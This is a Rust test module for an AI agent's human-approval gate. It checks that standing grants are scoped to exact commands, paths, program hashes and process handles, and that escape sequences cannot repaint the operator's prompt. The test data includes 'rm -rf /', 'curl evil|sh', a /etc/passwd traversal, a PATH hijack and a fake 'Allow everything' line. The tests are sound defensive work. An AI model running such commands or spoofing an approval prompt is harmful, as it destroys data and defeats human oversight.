    fn an_answer_to_a_superseded_question_is_rejected() {
        let mut auth = ApprovalAuthority::default();
        let scope = scope_of(&cargo_test());
        let first = auth.open_request();
        let _second = auth.open_request();
        assert_eq!(
            auth.record_response(
                ConfirmationResponse {
                    id: first,
                    outcome: ConfirmOutcome::Always
                },
                Some(&scope)
            ),
            Err(ResponseRejected::WrongRequest)
        );
    }

    /// ADVERSARIAL 10: cancellation must not let a pending answer become an
    /// approval.
    #[test]
    fn an_answer_after_cancellation_grants_nothing() {
        let mut auth = ApprovalAuthority::default();
        let scope = scope_of(&cargo_test());
        let id = auth.open_request();
        auth.abandon_request();
        assert_eq!(
            auth.record_response(
                ConfirmationResponse {
                    id,
                    outcome: ConfirmOutcome::Always
                },
                Some(&scope)
            ),
            Err(ResponseRejected::NothingPending)
        );
        assert_eq!(auth.grant_count(), 0);
    }

    /// Cancelling one action does not withdraw decisions about others.
    #[test]
    fn cancellation_does_not_revoke_unrelated_grants() {
        let mut auth = ApprovalAuthority::default();
        approve_always(&mut auth, &cargo_test());
        auth.open_request();
        auth.abandon_request();
        assert!(
            auth.covers(&scope_of(&cargo_test())),
            "an unrelated cancellation must not revoke a standing grant"
        );
    }

    // ── Lifetime ──────────────────────────────────────────────────────────

    /// ADVERSARIAL 9: grants belong to a session and do not travel.
    #[test]
    fn grants_are_not_shared_between_sessions() {
        let mut a = ApprovalAuthority::new(OperatorTrust::Prompt, "session-a");
        approve_always(&mut a, &cargo_test());
        let b = ApprovalAuthority::new(OperatorTrust::Prompt, "session-b");
        assert!(
            !b.covers(&scope_of(&cargo_test())),
            "a new session starts with no standing approvals"
        );
        assert_ne!(a.session(), b.session());
    }

    #[test]
    fn a_bridge_change_revokes_standing_grants() {
        let mut auth = ApprovalAuthority::default();
        approve_always(&mut auth, &cargo_test());
        auth.revoke_all("bridge identity changed");
        assert!(!auth.covers(&scope_of(&cargo_test())));
    }

    /// Declared isolation waives the prompt, but it is a policy input the
    /// operator states — not something a frontend or a bridge mode can set.
    #[test]
    fn declared_isolation_covers_everything_by_construction() {
        let auth = ApprovalAuthority::new(OperatorTrust::IsolatedEnvironment, "s");
        assert!(auth.covers(&scope_of(&rm_rf_root())));
        assert_eq!(auth.grant_count(), 0, "no grant was recorded to do it");
    }

    // ── Execution context (§1) ────────────────────────────────────────────

    /// ADVERSARIAL: the same argv in a different working directory runs
    /// different code — a planted `Cargo.toml` in `/tmp/untrusted` is not the
    /// project the human approved.
    #[test]
    fn a_different_cwd_is_a_different_authority() {
        let trusted = json!({"type":"RunCommand","command":"cargo","args":["test"],
                             "cwd":"/workspace/trusted"});
        let untrusted = json!({"type":"RunCommand","command":"cargo","args":["test"],
                               "cwd":"/tmp/untrusted"});
        let mut auth = ApprovalAuthority::default();
        approve_always(&mut auth, &trusted);
        assert!(auth.covers(&scope_of(&trusted)));
        assert!(
            !auth.covers(&scope_of(&untrusted)),
            "approving a command in one directory must not authorize it in another"
        );
    }

    /// The environment decides which binary `cargo` even is.
    #[test]
    fn a_different_environment_is_a_different_authority() {
        let clean = json!({"type":"RunCommand","command":"cargo","args":["test"]});
        let hijacked = json!({"type":"RunCommand","command":"cargo","args":["test"],
                              "env":{"PATH":"/tmp/evil/bin"}});
        let mut auth = ApprovalAuthority::default();
        approve_always(&mut auth, &clean);
        assert!(!auth.covers(&scope_of(&hijacked)));
    }

    /// Timeout and streaming change how long it runs, not what runs.
    #[test]
    fn non_security_fields_do_not_fragment_a_command_grant() {
        let a = json!({"type":"RunCommand","command":"cargo","args":["test"],"timeout_secs":30});
        let b = json!({"type":"RunCommand","command":"cargo","args":["test"],"timeout_secs":600});
        assert_eq!(scope_of(&a), scope_of(&b));
    }

    // ── HTTP effect (§2) ──────────────────────────────────────────────────

    #[test]
    fn http_method_is_part_of_the_authority() {
        let get = json!({"type":"HttpRequest","url":"https://x/api/item","method":"GET"});
        let del = json!({"type":"HttpRequest","url":"https://x/api/item","method":"DELETE"});
        let post = json!({"type":"HttpRequest","url":"https://x/api/item","method":"POST"});
        let mut auth = ApprovalAuthority::default();
        approve_always(&mut auth, &get);
        assert!(!auth.covers(&scope_of(&del)));
        assert!(!auth.covers(&scope_of(&post)));
    }

    #[test]
    fn a_mutating_request_with_a_different_body_is_a_different_authority() {
        let a =
            json!({"type":"HttpRequest","url":"https://x/api","method":"POST","body":"{\"a\":1}"});
        let b =
            json!({"type":"HttpRequest","url":"https://x/api","method":"POST","body":"{\"a\":2}"});
        assert_ne!(scope_of(&a), scope_of(&b));
    }

    /// `FetchUrl` is a GET by construction — no method to over-generalise.
    #[test]
    fn fetch_is_identified_by_url_alone() {
        let a = json!({"type":"FetchUrl","url":"https://x/doc"});
        let b = json!({"type":"FetchUrl","url":"https://x/doc","headers":{"A":"1"}});
        assert_eq!(scope_of(&a), scope_of(&b));
    }

    // ── Incus operation class (§3) ────────────────────────────────────────

    /// ADVERSARIAL: the operation class is the action type in this codebase —
    /// there is no generic Incus action carrying an operation field — so a
    /// restore and a delete on the same instance are separate authorities
    /// before the resource is even compared.
    #[test]
    fn incus_operations_do_not_share_a_grant() {
        let restore = json!({"type":"IncusRestoreSnapshot","remote":"local",
                             "container":"c1","name":"snap"});
        let delete = json!({"type":"IncusDeleteSnapshot","remote":"local",
                            "container":"c1","name":"snap"});
        let mut auth = ApprovalAuthority::default();
        approve_always(&mut auth, &restore);
        assert!(auth.covers(&scope_of(&restore)));
        assert!(
            !auth.covers(&scope_of(&delete)),
            "approving a restore must never authorize a delete"
        );
    }

    /// `RunIncus` has no `container` field — it launches from an image and
    /// runs a command. Keying on `container` put every RunIncus under one
    /// grant.
    #[test]
    fn run_incus_is_identified_by_image_and_command() {
        let a = json!({"type":"RunIncus","remote":"local","image":"ubuntu",
                       "command":"ls","args":[]});
        let b = json!({"type":"RunIncus","remote":"local","image":"ubuntu",
                       "command":"rm","args":["-rf","/"]});
        let mut auth = ApprovalAuthority::default();
        approve_always(&mut auth, &a);
        assert!(
            !auth.covers(&scope_of(&b)),
            "a different command in the instance is a different authority"
        );
    }

    // ── Filesystem identity (§4) ──────────────────────────────────────────

    /// A relative path names whatever the runtime's working directory happens
    /// to be. It cannot be remembered, so it is asked about every time.
    #[test]
    fn a_relative_path_grant_is_never_retained() {
        let rel = json!({"type":"WriteFile","path":"src/main.rs","content":"x"});
        let mut auth = ApprovalAuthority::default();
        approve_always(&mut auth, &rel);
        assert_eq!(
            auth.grant_count(),
            0,
            "a context-dependent target is not a grant"
        );
        assert!(!auth.covers(&scope_of(&rel)));
    }

    /// A path containing `..` can be re-pointed by a later resolution.
    #[test]
    fn a_path_with_parent_components_is_not_grantable() {
        let p = json!({"type":"WriteFile","path":"/workspace/../etc/passwd","content":"x"});
        assert!(!scope_of(&p).is_grantable());
    }

    #[test]
    fn an_absolute_path_is_grantable() {
        let p = json!({"type":"WriteFile","path":"/workspace/a.rs","content":"x"});
        assert!(scope_of(&p).is_grantable());
    }

    // ── Collision resistance (§5) ─────────────────────────────────────────

    /// ADVERSARIAL: a formatted `"{command} {args}"` renders these two
    /// identically. Structured fields cannot.
    #[test]
    fn a_split_differently_command_line_is_a_different_authority() {
        let a = json!({"type":"RunCommand","command":"git","args":["push","--force"]});
        let b = json!({"type":"RunCommand","command":"git push","args":["--force"]});
        assert_ne!(
            scope_of(&a),
            scope_of(&b),
            "separator ambiguity must not merge two authorities"
        );
    }

    /// Separators inside a value must not be able to imitate structure.
    #[test]
    fn separators_inside_values_do_not_collide() {
        let a = json!({"type":"WriteFile","path":"/a`, `/b"});
        let b = json!({"type":"PatchSet","patches":[{"path":"/a"},{"path":"/b"}]});
        assert_ne!(scope_of(&a), scope_of(&b));

        let c = json!({"type":"SshExec","user":"u@h","host":"x","command":"ls"});
        let d = json!({"type":"SshExec","user":"u","host":"h@x","command":"ls"});
        assert_ne!(scope_of(&c), scope_of(&d));
    }

    /// `describe()` is presentation; equality is authority. Two scopes may
    /// read alike and still be different — that must not make them equal.
    #[test]
    fn description_is_not_identity() {
        let a = json!({"type":"RunCommand","command":"ls","args":[],"env":{"A":"1"}});
        let b = json!({"type":"RunCommand","command":"ls","args":[],"env":{"A":"2"}});
        let (sa, sb) = (scope_of(&a), scope_of(&b));
        assert_eq!(sa.describe(), sb.describe(), "the env is not shown");
        assert_ne!(sa, sb, "but it is part of the authority");
    }

    // ── No broad grant (§6) ───────────────────────────────────────────────

    /// The confirmation path can only ever produce an operation-scoped grant,
    /// and there is no broader scope in the type system to widen to.
    #[test]
    fn the_confirmation_path_cannot_mint_a_type_wide_grant() {
        let mut auth = ApprovalAuthority::default();
        for action in [
            json!({"type":"RunCommand","command":"ls","args":[]}),
            json!({"type":"WriteFile","path":"/w/a","content":"x"}),
        ] {
            approve_always(&mut auth, &action);
        }
        // Every grant names a concrete resource; none covers a sibling.
        assert!(!auth.covers(&scope_of(
            &json!({"type":"RunCommand","command":"rm","args":["-rf","/"]})
        )));
        assert!(!auth.covers(&scope_of(
            &json!({"type":"WriteFile","path":"/etc/shadow","content":"x"})
        )));
    }

    #[test]
    fn a_grant_describes_its_scope_to_the_user() {
        let d = scope_of(&json!({"type":"RunCommand","command":"cargo",
                                          "args":["test"],"cwd":"/workspace"}))
        .describe();
        assert!(d.contains("cargo test"), "{d}");
        assert!(
            d.contains("/workspace"),
            "the directory is part of the grant: {d}"
        );
        assert!(d.contains("this session"), "{d}");

        let rel = scope_of(&json!({"type":"WriteFile","path":"rel.rs"})).describe();
        assert!(
            rel.contains("once"),
            "a non-grantable scope must say so: {rel}"
        );
    }

    // ── Persistence is opt-in (§1, §2) ────────────────────────────────────

    /// An action with no explicitly defined identity yields no scope, so it
    /// can be approved once and never for the session.
    #[test]
    fn an_unscoped_action_has_no_approval_scope() {
        assert!(ApprovalScope::of(&json!({"type": "Recall", "key": "k"})).is_none());
        assert!(ApprovalScope::of(&json!({"type": "AskHuman", "question": "?"})).is_none());
    }

    /// A *future* Action must not inherit persistent approval by existing.
    /// This is the fail-closed property: doing nothing yields one-shot.
    #[test]
    fn a_future_action_defaults_to_one_shot() {
        let invented = json!({"type": "SomeActionAddedIn2027", "target": "x"});
        assert!(
            ApprovalScope::of(&invented).is_none(),
            "an unmapped action must not gain a session grant by default"
        );
    }

    /// Approving an unscoped action with "always" is honoured once and
    /// remembers nothing.
    #[test]
    fn an_unscoped_action_cannot_mint_persistent_authority() {
        let action = json!({"type": "Recall", "key": "k"});
        let mut auth = ApprovalAuthority::default();
        let id = auth.open_request();
        let outcome = auth
            .record_response(
                ConfirmationResponse {
                    id,
                    outcome: ConfirmOutcome::Always,
                },
                ApprovalScope::of(&action).as_ref(),
            )
            .expect("the answer itself is legitimate");
        assert_eq!(outcome, ConfirmOutcome::Always, "the one-off is honoured");
        assert_eq!(
            auth.grant_count(),
            0,
            "but nothing persists without a stable identity"
        );
    }

    /// The set can only grow deliberately: an Action joining the vocabulary
    /// cannot join this list by accident, because the list is written down and
    /// this test compares against it.
    #[test]
    fn only_explicitly_scoped_actions_are_persistable() {
        /// A probe payload that **looks like** the action: every required
        /// catalogue field is present, non-empty, and of the **shape** that the
        /// arms of `of()` know how to read.
        ///
        /// SECURITY: the probe cannot be `json!({"type": name})`. Most arms of
        /// `of()` build an identity from empty strings — a defect in itself,
        /// documented on `WebSearch` and `DnsLookup` — but `RunProgram` refuses
        /// an empty program, and that is the right direction. A bare payload
        /// therefore tests nothing of a demanding arm: the review measured that
        /// an arm `"RunProgram" | "PreviewProgram" =>`, with `PreviewProgram`
        /// absent from `PERSISTABLE_ACTION_TYPES`, passed this guard green.
        ///
        /// **What the probe produces, type by type**, because the previous
        /// version promised coverage it did not have:
        ///
        /// | catalogue type | value | why |
        /// |---|---|---|
        /// | `string` | `"probe"` | |
        /// | `integer` | `1` | |
        /// | `boolean` | `true` | |
        /// | `object` | minimal action object | |
        /// | `array` | `["probe", minimal action object]` | `json_type_of` (build.rs:142-162) collapses `Vec<String>` and `Vec<Action>` onto the same `"array"`. The array therefore carries **both** shapes, a string AND an object. |
        /// | `any` | minimal action object | anything that is neither `String`/`bool`/integer/`Vec`/`Map` — 7 required fields, including `Simulate.target` and `PolicyCheck.action`. |
        ///
        /// The minimal action object carries `type` and `path`: these are the
        /// two keys the composite arms actually read on their elements (the
        /// `PatchSet` arm, :357-369, already does `p.get("path")`).
        ///
        /// **What the probe does not cover.** A future arm that required a key
        /// other than `type` or `path` on a composite element would fall back
        /// into the hole. This is not hypothetical: `Subscribe.event_type` is a
        /// `#[serde(tag = "kind")]` enum, so its discriminant key is `kind` —
        /// an arm reading it would be invisible here (surviving mutant
        /// measured). And `json_type_of` conflates `Vec<String>` and
        /// `Vec<Action>` under `"array"`: the probe therefore sends both shapes
        /// in the same array, a string AND an object, because an array cannot
        /// be "the richest" without ceasing to be scalar. The probe follows the
        /// shape, it does not guess it: this test catches the ordinary
        /// oversight, not the adversary.
        fn probe_payload(name: &str) -> serde_json::Value {
            // An object that looks like a nested action. `type` and `path`
            // are the keys the composite arms read on their elements.
            let nested = || json!({"type": "probe", "path": "probe"});
            let mut payload = serde_json::Map::new();
            payload.insert("type".into(), json!(name));
            if let Some(meta) = x0ne_actions::action_meta(name) {
                for field in meta.required_fields {
                    let ty = meta
                        .field_types
                        .iter()
                        .find(|(f, _)| f == field)
                        .map(|(_, t)| *t)
                        .unwrap_or("string");
                    // Non-empty in every case: emptiness is what lets a
                    // demanding arm through the guard. And for `array`, a
                    // string AND an object in the same array: sending only
                    // one of the two makes the other reading invisible, which
                    // makes an arm fail silently and makes its `None`
                    // indistinguishable from "no scope".
                    let value = match ty {
                        "integer" | "number" => json!(1),
                        "boolean" => json!(true),
                        "string" => json!("probe"),
                        "array" => json!(["probe", nested()]),
                        // `object` and `any`: see the doc-comment table.
                        _ => nested(),
                    };
                    payload.insert((*field).to_string(), value);
                }
            }
            serde_json::Value::Object(payload)
        }

        for name in ApprovalScope::PERSISTABLE_ACTION_TYPES {
            assert!(
                ApprovalScope::of(&probe_payload(name)).is_some(),
                "{name} is listed as persistable but has no scope arm"
            );
        }
        // And nothing outside the list is persistable.
        //
        // SECURITY: the probe is `probe_payload`, the SAME as the loop above,
        // and above all not `json!({"type": name})`. A bare payload tests
        // nothing of an arm that requires a field: since `RunProgram` refuses
        // an empty `source`, an arm written `"RunProgram" | "X" =>` with `X`
        // absent from `PERSISTABLE_ACTION_TYPES` passed this guard green —
        // measured. The test must probe with what the action really looks
        // like, otherwise it only watches the lenient arms.
        for name in x0ne_actions::all_type_names() {
            if ApprovalScope::PERSISTABLE_ACTION_TYPES.contains(name) {
                continue;
            }
            assert!(
                ApprovalScope::of(&probe_payload(name)).is_none(),
                "{name} gained a persistent scope without being declared"
            );
        }
    }

    /// An explicitly scoped action still mints a grant, so the opt-in works.
    #[test]
    fn an_explicitly_scoped_action_can_mint_a_session_grant() {
        let mut auth = ApprovalAuthority::default();
        approve_always(&mut auth, &cargo_test());
        assert_eq!(auth.grant_count(), 1);
        assert!(auth.covers(&scope_of(&cargo_test())));
    }

    /// The frontend capability contract: no stable scope means no persistent
    /// option may be offered.
    #[test]
    fn the_frontend_is_told_when_no_persistent_option_exists() {
        assert!(ApprovalScope::of(&json!({"type": "Recall", "key": "k"})).is_none());
        let scoped = ApprovalScope::of(&cargo_test()).expect("scoped");
        assert!(scoped.describe().contains("this session"));
    }

    // ── asm-ai: the authority of a program ───────────────────────────────────

    /// SECURITY: two different programs are two different authorities, and
    /// **the same authority must survive a change of payload shape**.
    ///
    /// The program travels in the payload: it has no name, and its entire text
    /// as a `HashSet` key would be both heavy and fragile (indentation, line
    /// endings). The identity is the SHA-256 of the source. A collision in an
    /// authority key is an authority nobody granted — that is this module's
    /// reason for being (:64-69).
    ///
    /// The three forms exist because `deser_string_or_lines` accepts all three
    /// on the action side (`x0ne-actions/src/lib.rs:1545-1573`): `source`
    /// string, `source` array of lines, `program` alias. `ApprovalScope::of`
    /// works on the **raw JSON**, before any typed deserialisation — if it read
    /// only one form, the same program emitted in another form would get
    /// another key, and a granted "always" would no longer cover anything.
    /// Worse the other way: a missing `source` would give `hash("")`, a single
    /// key shared by all malformed programs.
    ///
    /// A failure here means either that an "always" granted to a harmless
    /// program covers another program, or that an "always" no longer covers its own.
    #[test]
    fn two_programs_are_two_authorities() {
        let a = json!({"type": "RunProgram", "source": "#!asm-ai/v0\ncount files\n"});
        let b = json!({"type": "RunProgram", "source": "#!asm-ai/v0\ncount matches\n"});
        let sa = ApprovalScope::of(&a).expect("RunProgram has a scope");
        let sb = ApprovalScope::of(&b).expect("RunProgram has a scope");
        assert_ne!(sa, sb, "two distinct sources do not share an authority");

        // The same source, twice, is the same authority — otherwise an "always"
        // would never be of any use.
        let sa2 = ApprovalScope::of(&a).expect("scope");
        assert_eq!(sa, sa2);

        // Form 2: `source` as an array of lines. `deser_string_or_lines` joins them
        // with "\n", and `of()` must join the same way, otherwise the key changes with the form.
        let as_lines = json!({
            "type": "RunProgram",
            "source": ["#!asm-ai/v0", "count files", ""]
        });
        assert_eq!(
            ApprovalScope::of(&as_lines).expect("scope"),
            sa,
            "the array of lines joined by \\n is the same program"
        );

        // Form 3: the `program` alias.
        let aliased = json!({"type": "RunProgram", "program": "#!asm-ai/v0\ncount files\n"});
        assert_eq!(
            ApprovalScope::of(&aliased).expect("scope"),
            sa,
            "the `program` alias names the same field"
        );
    }

    /// SECURITY: an empty program has no identity, hence no authority.
    ///
    /// `hash("")` is a perfectly valid and perfectly wrong key: it would be
    /// shared by every payload whose field is missing or named differently.
    /// This is exactly the defect that already exists elsewhere in this file —
    /// see the note below. Here: `None`, hence one-off approval, never
    /// persisted.
    ///
    /// A failure here means that an "always" granted to a malformed payload
    /// covers all other malformed payloads.
    #[test]
    fn a_program_with_no_source_has_no_authority_at_all() {
        assert!(ApprovalScope::of(&json!({"type": "RunProgram"})).is_none());
        assert!(ApprovalScope::of(&json!({"type": "RunProgram", "source": ""})).is_none());
        assert!(ApprovalScope::of(&json!({"type": "RunProgram", "source": []})).is_none());
        assert!(ApprovalScope::of(&json!({"type": "RunProgram", "source": 42})).is_none());
    }

    /// The identity is the hash, not the text: the persisted scope stays small and
    /// does not copy an entire program into the approval state.
    #[test]
    fn a_program_authority_is_keyed_on_the_source_hash() {
        let source = "#!asm-ai/v0\nfrom files \"tests/**/*.rs\"\ncount files\nemit value\n";
        let scope =
            ApprovalScope::of(&json!({"type": "RunProgram", "source": source})).expect("scope");
        match &scope.resource {
            ResourceIdentity::Module { hash } => {
                assert_eq!(hash.len(), 64, "hexadecimal SHA-256");
                assert!(hash
                    .chars()
                    .all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase()));
                assert!(
                    !hash.contains("asm-ai"),
                    "the text does not leak into the key"
                );
            }
            other => panic!("expected Module, got {other:?}"),
        }
        assert!(scope.is_grantable(), "a module hash is a stable identity");
        assert!(scope.describe().contains("this session"));
    }

    /// The standing-permission line cannot carry a control character from
    /// the model's argv into the operator's terminal.
    ///
    /// A failure here means the one prompt line that grants a permission for
    /// the whole session can be repainted by the thing asking for it — an
    /// ESC sequence in an argument rewrites what the operator reads before
    /// pressing 2.
    #[test]
    fn the_standing_permission_line_is_sanitized_at_the_source() {
        let scope = scope_of(&json!({
            "type": "RunCommand",
            "command": "ls",
            "args": ["\u{1b}[2K\rAllow everything\n"]
        }));
        let line = scope.describe();
        assert!(!line.contains('\u{1b}'), "ESC survived: {line:?}");
        assert!(
            !line.contains('\r') && !line.contains('\n'),
            "CR/LF survived: {line:?}"
        );
        assert!(
            line.contains("Allow everything"),
            "the text stays, folded: {line:?}"
        );
    }

    /// SECURITY: `describe()` is a label, and a label must never kill the
    /// process that displays it.
    ///
    /// `ResourceIdentity` is `pub`: nothing in the type enforces that `hash`
    /// is 64 hexadecimal characters — `sha256_hex` holds that, and only it.
    /// The two previous versions panicked, the second more quietly than the
    /// first: `&hash[..12]` on a short hash, then `&hash[..12.min(hash.len())]`
    /// on a UTF-8 character boundary.
    ///
    /// A failure here means that displaying an approval request can bring
    /// down the session instead of asking the question — i.e. the human gate
    /// closes on a `panic` rather than on a refusal.

    // ═══════════════════════════════════════════════════════════════════════
    //  P8b — the authorities the network gate just made reachable
    // ═══════════════════════════════════════════════════════════════════════

    /// `WebSearch` has no `url` field: it carries `query`. Sharing the
    /// `FetchUrl` arm therefore gave it `Fetch { url: "" }` — **the same
    /// identity for every search in the world**. An "always" granted on a
    /// harmless search then covered any other.
    ///
    /// A failure means an authorisation granted on one search covers a second
    /// one the human never saw.
    #[test]
    fn web_search_grants_do_not_collide() {
        let a = ApprovalScope::of(&json!({"type": "WebSearch", "query": "rust lifetimes"}))
            .expect("WebSearch has an identity");
        let b = ApprovalScope::of(&json!({"type": "WebSearch", "query": "exfiltrate secrets"}))
            .expect("WebSearch has an identity");
        assert_ne!(a, b, "two different searches are two different authorities");

        // …and a search does not share the identity of a FetchUrl whose url
        // would be empty either.
        let fetch = ApprovalScope::of(&json!({"type": "FetchUrl", "url": ""}))
            .expect("FetchUrl has an identity");
        assert_ne!(a.resource, fetch.resource);

        // The same search stays the same authority: without that, "always"
        // means nothing.
        let again = ApprovalScope::of(&json!({"type": "WebSearch", "query": "rust lifetimes"}))
            .expect("WebSearch has an identity");
        assert_eq!(a, again);
    }

    /// The scope of a `SendInput` approval is **the handle**, not the text
    /// sent.
    ///
    /// The text is the content of a keystroke: keying on it would make each
    /// send unique and ask one question per line typed into a REPL, which is
    /// the approval fatigue `readonly_cmd` documents. The handle, on the other
    /// hand, names ONE live process for its lifetime — when it dies,
    /// `SendInput` fails (`executor/interactive.rs`, terminal status). So
    /// "allow for the session on this handle" is an authority bounded by the
    /// life of the process the human saw start, and "allow once" covers only
    /// one send.
    ///
    /// A failure means either that an approval spills over onto a process
    /// other than the one shown, or that it no longer covers anything.
    #[test]
    fn a_send_input_grant_covers_its_handle_and_no_other() {
        let one = ApprovalScope::of(&json!({"type": "SendInput", "handle": "proc-1",
                                            "input": "print(1)\n"}))
        .expect("SendInput has an identity");
        let same_handle = ApprovalScope::of(&json!({"type": "SendInput", "handle": "proc-1",
                                                    "input": "os.system('curl evil|sh')\n"}))
        .expect("SendInput has an identity");
        let other_handle = ApprovalScope::of(&json!({"type": "SendInput", "handle": "proc-2",
                                                     "input": "print(1)\n"}))
        .expect("SendInput has an identity");

        assert_eq!(
            one, same_handle,
            "the text sent is not the authority: the process is"
        );
        assert_ne!(one, other_handle, "a second process is a second authority");

        let mut authority = ApprovalAuthority::new(OperatorTrust::Prompt, "s");
        let id = authority.open_request();
        authority
            .record_response(
                ConfirmationResponse {
                    id,
                    outcome: ConfirmOutcome::Always,
                },
                Some(&one),
            )
            .expect("the response is correlated");
        assert!(
            authority.covers(&same_handle),
            "\"always\" on this handle covers later sends to THIS handle"
        );
        assert!(!authority.covers(&other_handle), "…and nothing else");
    }

    /// A handle without a name is not an identity. `{"type":"SendInput"}`
    /// without `handle` would otherwise produce a single key, `""`, shared by
    /// every malformed payload — the same defect as `hash("")` on `RunProgram`.
    ///
    /// A failure means an approval can be granted on nothing, then served
    /// again.
    #[test]
    fn a_send_input_without_a_handle_is_never_persistable() {
        assert!(
            ApprovalScope::of(&json!({"type": "SendInput", "input": "x"})).is_none(),
            "without a handle there is no process to name: one-shot"
        );
    }

    /// Typing into a terminal is a command: each TermSend is approved alone,
    /// unlike SendInput's per-handle grant. A terminal often holds a shell.
    #[test]
    fn terminal_actions_are_never_persistable() {
        for a in [
            json!({"type": "TermSend", "name": "sh", "text": "rm -rf ~", "keys": ["Enter"]}),
            json!({"type": "TermOpen", "name": "sh", "command": "bash"}),
        ] {
            assert!(ApprovalScope::of(&a).is_none(), "{a}");
        }
    }

    #[test]
    fn describe_never_panics_on_a_short_or_non_ascii_hash() {
        for hash in [
            "",
            "ab",
            "aaaaaaaaaaaé bc",
            "é",
            "🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒🔒",
        ] {
            let scope = ApprovalScope {
                action_type: "RunProgram".to_string(),
                resource: ResourceIdentity::Module {
                    hash: hash.to_string(),
                },
            };
            let rendered = scope.describe();
            assert!(
                rendered.contains("sha256:"),
                "the label stays readable on {hash:?}: {rendered}"
            );
        }
    }

    /// SECURITY: the two program hashes — the orchestrator's and the runtime's
    /// — produce the **same** string.
    ///
    /// It is the key that links the authority granted by the human to the
    /// transaction the runtime commits. The two implementations are separate
    /// because the orchestrator does not link the runtime (`Cargo.toml:99-107`:
    /// dev-dependency only, with the reason written down). This test holds the
    /// equality, and it is allowed to exist because `x0ne-runtime` **is**
    /// available as a dev-dependency — it is a test, not a production link.
    ///
    /// A failure here means a human approves one program and the runtime
    /// commits another, or more likely that it finds nothing and refuses.
    #[test]
    fn the_orchestrator_and_the_runtime_hash_a_program_identically() {
        for src in [
            "",
            "#!asm-ai/v0\n",
            "#!asm-ai/v0\nfrom files \"tests/**/*.rs\"\ncount files\nemit value\n",
            "accents éàü and a NUL byte in a string\u{0}",
        ] {
            assert_eq!(
                super::sha256_hex(src),
                x0ne_runtime::scripted::hash_source(src),
                "the two hashes diverge on {src:?}"
            );
        }
    }
}
